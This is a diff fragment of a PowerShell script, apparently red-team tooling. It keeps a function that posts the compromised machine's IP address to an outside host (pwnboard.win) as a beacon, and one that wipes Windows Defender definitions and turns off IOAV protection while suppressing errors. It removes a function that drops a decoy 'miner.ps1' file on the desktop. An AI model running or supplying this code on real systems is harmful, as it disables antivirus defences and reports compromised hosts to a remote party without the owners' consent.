@@ -1,9 +1,6 @@
 $mm = @'
 function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
 '@.Trim()
-$gg = @'
-function gg {$g=[Guid]::newGuid().Guid.Replace("-", "").substring(0,10) + "miner.ps1";New-Item -Path (Join-Path $env:USERPROFILE 'Desktop') -Force -Name $g | Out-Null;}
-'@.Trim()
 $dd = @'
 function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
 '@.Trim()
